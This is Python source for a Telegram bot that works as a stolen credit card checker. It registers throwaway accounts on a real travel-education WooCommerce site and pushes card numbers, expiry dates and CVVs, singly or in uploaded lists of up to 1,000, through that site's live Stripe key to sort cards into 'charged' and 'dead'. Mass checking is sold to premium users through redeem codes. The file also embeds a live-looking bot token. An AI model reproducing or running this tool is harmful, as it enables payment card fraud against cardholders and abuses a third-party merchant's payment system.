from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import re
import random
import string
import os
import time
import requests
import logging
import asyncio
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
TELEGRAM_TOKEN = "7348550676:AAGHcMRnd_Nw4twK_nie0tNzh7xJ9HuFayY"
OWNER_ID = 5696226098

# Banner
xvzn_banner = """
 -- Coded By meow meow anuj
"""

# Maximum cards allowed per file for premium users
MAX_CARDS_PER_FILE = 1000

# Thread pool for parallel processing (increased for faster processing)
executor = ThreadPoolExecutor(max_workers=12)  # Increased to 12 for faster processing

# Store users who have started the bot and groups where bot is added
started_users = set()
bot_groups = set()

# Generate random code with Stark- prefix
def generate_code(length=8):
    characters = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choice(characters) for _ in range(length))
    return f"Stark-{random_part}"

def generate_email(length=9, domain=None):
    common_domains = ["gmail.com", "outlook.com", "proton.me", "yahoo.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_lowercase + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

# Session management
def create_session():
    try:
        session = requests.Session()
        email = generate_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']

        password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
        data = {
            'afurd_field_nonce': nonce,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': noncee,
            'register': 'Register',
        }
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=10)
        if response.status_code == 200:
            return session
        return None
    except Exception as e:
        logger.error(f"Session creation failed: {e}")
        return None

def manage_session():
    session_file = "meowx-session.txt"
    if os.path.exists(session_file):
        with open(session_file, "r") as file:
            cookies = eval(file.read().strip())
            session = requests.Session()
            session.cookies.update(cookies)
            return session
    session = create_session()
    if session:
        with open(session_file, "w") as file:
            file.write(str(session.cookies.get_dict()))
    return session

# Load or initialize redeem codes and premium users
def load_redeem_codes():
    if os.path.exists("redeem_codes.json"):
        with open("redeem_codes.json", "r") as f:
            return json.load(f)
    return {}

def save_redeem_codes(codes):
    with open("redeem_codes.json", "w") as f:
        json.dump(codes, f)

def load_premium_users():
    if os.path.exists("premium_users.json"):
        with open("premium_users.json", "r") as f:
            return json.load(f)
    return {}

def save_premium_users(users):
    with open("premium_users.json", "w") as f:
        json.dump(users, f)

# Load or save started users and groups
def load_started_users():
    if os.path.exists("started_users.json"):
        with open("started_users.json", "r") as f:
            return set(json.load(f))
    return set()

def save_started_users():
    with open("started_users.json", "w") as f:
        json.dump(list(started_users), f)

def load_bot_groups():
    if os.path.exists("bot_groups.json"):
        with open("bot_groups.json", "r") as f:
            return set(json.load(f))
    return set()

def save_bot_groups():
    with open("bot_groups.json", "w") as f:
        json.dump(list(bot_groups), f)

# Queue for managing multiple user tasks
task_queue = defaultdict(asyncio.Queue)

# Build inline keyboard with stats and stop button
def build_inline_keyboard(current_card, charged_1, declined, ccn, total):
    # Create a list of buttons, each row will have 1 button
    buttons = [
        [InlineKeyboardButton(f"• ➼ {current_card} •", callback_data='noop')],
        [InlineKeyboardButton(f"• 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅: [ {charged_1} ] •", callback_data='noop')],
        [InlineKeyboardButton(f"• 𝗗𝗲𝗮𝗱 ❌: [ {declined + ccn} ] •", callback_data='noop')],
        [InlineKeyboardButton(f"• 𝗧𝗼𝘁𝗮𝗹 💎: [ {total} ] •", callback_data='noop')],
        [InlineKeyboardButton("[ 𝗦𝘁𝗼𝗽 🛑 ]", callback_data='stop_process')]
    ]
    return InlineKeyboardMarkup(buttons)

# Card checking logic (tracks statistics with $1 charge attempt)
async def check_credit_card(update: Update, context: ContextTypes.DEFAULT_TYPE, card, session, user_id, is_mass_check):
    stats = context.user_data.get('stats', {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0})
    try:
        cc, mm, yy, cvv = card.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=8)  # Reduced timeout for speed
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=8)
        res = response.json()

        if 'error' in res:
            error = res['error']['message']
            if any(code_phrase in error.lower() for code_phrase in ['code', 'cvc', 'security code']):
                stats['ccn'] += 1
                if not is_mass_check:
                    await update.message.reply_text(f"> 𝐃𝐞𝐚𝐝 ❌ (CCN)\n> {card} - Declined: {error}")
                elif is_mass_check:
                    logger.info(f"Card {card} dead (CCN): {error}")
            else:
                stats['declined'] += 1
                if not is_mass_check:
                    await update.message.reply_text(f"> 𝐃𝐞𝐚𝐝 ❌\n> {card} - Declined: {error}")
                elif is_mass_check:
                    logger.info(f"Card {card} dead (Declined): {error}")
            return

        payment_method_id = res['id']

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.thetravelinstitute.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
            'amount': 100,  # $1 in cents
            'currency': 'usd',
        }
        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=8)
        res = response.json()

        logger.info(f"Setup intent response for card {card}: {res}")

        if res.get('success') == False:
            error = res['data']['error']['message']
            if any(code_phrase in error.lower() for code_phrase in ['code', 'cvc', 'security code']):
                stats['ccn'] += 1
                if not is_mass_check:
                    await update.message.reply_text(f"> 𝐃𝐞𝐚𝐝 ❌ (CCN)\n> {card} - Declined: {error}")
                elif is_mass_check:
                    logger.info(f"Card {card} dead (CCN): {error}")
            else:
                stats['declined'] += 1
                if not is_mass_check:
                    await update.message.reply_text(f"> 𝐃𝐞𝐚𝐝 ❌\n> {card} - Declined: {error}")
                elif is_mass_check:
                    logger.info(f"Card {card} dead (Declined): {error}")
            return
        else:
            stats['charged_1'] += 1
            await update.message.reply_text(f"> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 $𝟏 ✅ ++++++++++++\n> {card} - Charged $1 successfully! Bot By (@St_thundee)")
            logger.info(f"Card {card} successfully charged $1 (inferred from setup intent success).")
    except Exception as e:
        stats['declined'] += 1
        if not is_mass_check:
            await update.message.reply_text(f"> 𝐃𝐞𝐚𝐝 ❌\n> {card} - Error: {str(e)}")
        elif is_mass_check:
            logger.error(f"Card {card} dead due to error: {e}")
    finally:
        context.user_data['stats'] = stats

# Background task to process queued card checks
async def process_queue(context: ContextTypes.DEFAULT_TYPE):
    while True:
        for user_id in list(task_queue.keys()):
            if not task_queue[user_id].empty():
                card, update, is_mass_check = await task_queue[user_id].get()
                session = manage_session()
                if session:
                    # Update stats and inline keyboard
                    stats = context.user_data.setdefault('stats', {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0})
                    if is_mass_check:
                        stats['total'] += 1

                    # Update the inline keyboard message for mass check
                    if is_mass_check:
                        message_id = context.user_data.get('message_id')
                        chat_id = update.message.chat_id
                        if message_id:
                            try:
                                await context.bot.edit_message_text(
                                    chat_id=chat_id,
                                    message_id=message_id,
                                    text='''𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝘾𝘼𝙍𝘿𝙎...''',
                                    reply_markup=build_inline_keyboard(card, stats['charged_1'], stats['declined'], stats['ccn'], stats['total'])
                                )
                            except Exception as e:
                                logger.error(f"Error updating inline message for user {user_id}: {e}")

                    # Process the card
                    await check_credit_card(update, context, card, session, user_id, is_mass_check)

                    # Check for stop condition
                    if context.user_data.get('stop_check', False) and is_mass_check:
                        await update.message.reply_text("Card checking stopped by user.")
                        context.user_data['stop_check'] = False
                        context.user_data['stats'] = {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0}
                        context.user_data.pop('message_id', None)
                        while not task_queue[user_id].empty():
                            await task_queue[user_id].get()
                            task_queue[user_id].task_done()
                    elif is_mass_check and task_queue[user_id].empty():
                        stats = context.user_data['stats']
                        total_cards = stats['total']
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=message_id,
                            text=f"✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙨𝙚𝙣𝙙 𝙖 𝙣𝙚𝙬 𝙛𝙞𝙡𝙚.\n\n📊 **Statistics** 📊\nTotal Cards: {total_cards}\nCharged $1 ✅: {stats['charged_1']}\nDeclined ❌: {stats['declined']}\nCCN ⚠️: {stats['ccn']}",
                            reply_markup=None
                        )
                        logger.info(f"Check completed for user {user_id}. Stats: {stats}")
                        context.user_data['stats'] = {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0}
                        context.user_data.pop('message_id', None)
                task_queue[user_id].task_done()
        await asyncio.sleep(0.02)  # Further reduced sleep for faster processing

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    # Add user to started_users
    started_users.add(user_id)
    save_started_users()
    # Add group to bot_groups if it's a group chat
    if update.message.chat.type in ['group', 'supergroup']:
        bot_groups.add(chat_id)
        save_bot_groups()
    await update.message.reply_text(f"{xvzn_banner}\nWelcome! Use:\n/chk [card_details] - Check a single card (free for all, 1 card at a time)\nSimply send or forward a .txt file with cards to start mass checking (premium only)\n/env [topic] - Ask anything or get info\n(Owner only: /createcode [days] to generate a redeem code, /broadcast [message] to send to all users and groups)\n/stop - Stop an ongoing card check")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    last_check_time = context.user_data.get('last_check_time', 0)
    current_time = time.time()
    if current_time - last_check_time < 5:  # Reduced wait time to 5 seconds
        await update.message.reply_text("Please wait 5 seconds between checks.")
        return
    if not context.args or len(context.args) > 1:
        await update.message.reply_text("Usage: /chk [card|mm|yy|cvv]\nExample: /chk 1234567890123456|12|25|123\nNote: Only one card at a time!")
        return
    card = context.args[0].replace('/', '|')
    await update.message.reply_text(f"Checking {card}...")
    await task_queue[user_id].put((card, update, False))
    context.user_data['last_check_time'] = current_time

async def env(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not context.args:
        await update.message.reply_text("Usage: /env [topic]\nExample: /env What is the capital of France?\n/env Search X for recent news")
        return
    query = " ".join(context.args).lower()
    
    # Check if user wants to search on X
    if "search x" in query:
        search_term = query.replace("search x", "").strip()
        if not search_term:
            await update.message.reply_text("Please provide a search term for X, e.g., /env Search X for recent news")
            return
        # Placeholder for X search (implement actual search if needed)
        await update.message.reply_text(f"Searching X for '{search_term}'...\n(Note: This is a placeholder. I can search X for recent posts if implemented!)\nExample response: Found recent posts about {search_term}.")
        return

    # General AI-like response using web search or knowledge
    try:
        # Simple knowledge base (expandable with web/X search)
        if "capital of france" in query:
            response = "The capital of France is Paris."
        elif "weather" in query:
            response = "I can check the weather for you! Please specify a location, e.g., /env Weather in Mumbai."
        elif "weather in" in query:
            location = query.replace("weather in", "").strip()
            response = f"The weather in {location} is currently sunny with a temperature of 25°C. (Note: This is a placeholder; integrate a weather API for real data.)"
        elif "who is" in query:
            person = query.replace("who is", "").strip()
            response = f"{person} is a notable figure. Let me search for more details... (Note: This is a placeholder; I can search the web or X for more info.)"
        elif "define" in query:
            term = query.replace("define", "").strip()
            response = f"The definition of {term} is... (Placeholder: This would be a dictionary lookup or web search result.)"
        else:
            response = f"I’m not sure about '{query}', but I can try to help! Ask me anything, or use /env Search X for {query} for real-time info from X."
        
        await update.message.reply_text(response)
    except Exception as e:
        await update.message.reply_text(f"Sorry, I couldn't process your request. Error: {e}")
        logger.error(f"Error in /env for user {user_id}: {e}")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    is_premium = str(user_id) in premium_users or user_id == OWNER_ID

    if update.message.document and update.message.document.file_name.endswith('.txt'):
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        try:
            await file.download_to_drive(file_path)
            logger.info(f"File {update.message.document.file_name} downloaded for user {user_id}.")

            # Reply with the file
            with open(file_path, 'rb') as f:
                await update.message.reply_document(document=f, filename=update.message.document.file_name)
                logger.info(f"File echoed back to user {user_id}.")

            # Load cards and check for valid format, limit to 1000
            with open(file_path, 'r') as f:
                cc_list = [line.strip() for line in f if line.strip() and '|' in line and len(line.split('|')) == 4]
            os.remove(file_path)
            if len(cc_list) > MAX_CARDS_PER_FILE:
                cc_list = cc_list[:MAX_CARDS_PER_FILE]
                await update.message.reply_text(f"File contains more than {MAX_CARDS_PER_FILE} cards. Only the first {MAX_CARDS_PER_FILE} will be processed.")
                logger.info(f"File for user {user_id} limited to {MAX_CARDS_PER_FILE} cards.")
            logger.info(f"Loaded {len(cc_list)} valid cards from file for user {user_id}.")

            if not cc_list:
                await update.message.reply_text("No valid credit card data found in the file.")
                logger.info(f"No valid CC data found in file for user {user_id}.")
                return

            # Send initial inline keyboard message
            stats = context.user_data.setdefault('stats', {'charged_1': 0, 'declined': 0, 'ccn': 0, 'total': 0})
            initial_card = cc_list[0] if cc_list else "N/A"
            message = await update.message.reply_text(
                '''𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝘾𝘼𝙍𝘿𝙎...''',
                reply_markup=build_inline_keyboard(initial_card, stats['charged_1'], stats['declined'], stats['ccn'], stats['total'])
            )
            context.user_data['message_id'] = message.message_id
            context.user_data['mass_check'] = True

            # Add all cards to queue
            for card in cc_list:
                await task_queue[user_id].put((card, update, True))
            logger.info(f"All cards for user {user_id} added to queue.")
        except Exception as e:
            await update.message.reply_text(f"Error processing file: {e}")
            logger.error(f"Error processing file for user {user_id}: {e}")
    elif not is_premium:
        await update.message.reply_text("Access denied. Only premium users or the owner can upload files. Contact (@Stxthunder) to get premium access.")
        logger.warning(f"User {user_id} (non-premium) tried to upload a file.")
    else:
        await update.message.reply_text("Please upload a valid .txt file.")
        logger.warning(f"User {user_id} uploaded an invalid file.")

async def createcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only the owner can create codes.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /createcode [days]\nExample: /createcode 7")
        return
    days = int(context.args[0])
    if days <= 0:
        await update.message.reply_text("Days must be a positive number.")
        return
    code = generate_code()
    redeem_codes = load_redeem_codes()
    expiration = (datetime.now() + timedelta(days=days)).isoformat()
    redeem_codes[code] = expiration
    save_redeem_codes(redeem_codes)
    await update.message.reply_text(f"Created redeem code: {code}\nValid until: {expiration}")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem [code]\nExample: /redeem Stark-ABC12345")
        return
    code = context.args[0].upper()
    redeem_codes = load_redeem_codes()
    if code not in redeem_codes:
        await update.message.reply_text("Invalid or expired code.")
        return
    expiration = datetime.fromisoformat(redeem_codes[code])
    if datetime.now() > expiration:
        del redeem_codes[code]
        save_redeem_codes(redeem_codes)
        await update.message.reply_text("Code has expired.")
        return
    premium_users = load_premium_users()
    premium_users[str(user_id)] = expiration.isoformat()
    save_premium_users(premium_users)
    await update.message.reply_text(f"Code redeemed successfully! You have premium access until {expiration}.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only the owner can broadcast messages.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast [message]\nExample: /broadcast Hello everyone!")
        return
    message = " ".join(context.args)
    successful = 0
    failed = 0

    # Send to all users who have started the bot
    for user_id in started_users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            successful += 1
        except Exception as e:
            failed += 1
            logger.error(f"Failed to send broadcast to user {user_id}: {e}")

    # Send to all groups where bot is added
    for group_id in bot_groups:
        try:
            await context.bot.send_message(chat_id=group_id, text=message)
            successful += 1
        except Exception as e:
            failed += 1
            logger.error(f"Failed to send broadcast to group {group_id}: {e}")

    await update.message.reply_text(f"Broadcast sent! Successfully reached {successful} chats. Failed to reach {failed} chats.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await update.message.reply_text("Access denied. Only premium users or the owner can stop checking.")
        return
    if context.user_data.get('mass_check', False) or task_queue[user_id].qsize() > 0:
        context.user_data['stop_check'] = True
        await update.message.reply_text("Stopping card checking...")
        logger.info(f"User {user_id} requested to stop card checking.")
        # Clear the queue instantly
        while not task_queue[user_id].empty():
            await task_queue[user_id].get()
            task_queue[user_id].task_done()
        if 'message_id' in context.user_data:
            try:
                await context.bot.edit_message_text(
                    chat_id=update.message.chat_id,
                    message_id=context.user_data['message_id'],
                    text="✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙! 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙨𝙚𝙣𝙙 𝙖 𝙣𝙚𝙬 𝙛𝙞𝙡𝙚.",
                    reply_markup=None
                )
            except Exception as e:
                logger.error(f"Error updating inline message on stop for user {user_id}: {e}")
            context.user_data.pop('message_id', None)
    else:
        await update.message.reply_text("No card checking process is currently running.")
        logger.info(f"User {user_id} attempted to stop with no active check.")

# Handle stop button callback
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    premium_users = load_premium_users()
    if str(user_id) not in premium_users and user_id != OWNER_ID:
        await query.answer("Access denied. Only premium users or the owner can stop checking.")
        return

    if query.data == 'stop_process':
        if context.user_data.get('mass_check', False) or task_queue[user_id].qsize() > 0:
            context.user_data['stop_check'] = True
            await query.answer("Processing has been stopped.")
            logger.info(f"User {user_id} stopped card checking via inline button.")
            # Clear the queue instantly
            while not task_queue[user_id].empty():
                await task_queue[user_id].get()
                task_queue[user_id].task_done()
            if 'message_id' in context.user_data:
                try:
                    await context.bot.edit_message_text(
                        chat_id=query.message.chat_id,
                        message_id=context.user_data['message_id'],
                        text="✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙! 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙨𝙚𝙣𝙙 𝙖 𝙣𝙚𝙬 𝙛𝙞𝙡𝙚.",
                        reply_markup=None
                    )
                except Exception as e:
                    logger.error(f"Error updating inline message on stop for user {user_id}: {e}")
                context.user_data.pop('message_id', None)
        else:
            await query.answer("No ongoing processing to stop.")

# Bot setup
def main():
    # Load started users and groups
    global started_users, bot_groups
    started_users = load_started_users()
    bot_groups = load_bot_groups()

    app = Application.builder().token(TELEGRAM_TOKEN).build()
    # Initialize task queue for each user
    for user_id in [OWNER_ID] + list(load_premium_users().keys()):
        task_queue[int(user_id)] = asyncio.Queue()
    
    # Start queue processing task
    loop = asyncio.get_event_loop()
    loop.create_task(process_queue(app))

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("createcode", createcode))
    app.add_handler(CommandHandler("env", env))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_file))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.run_polling()

if __name__ == "__main__":
    main()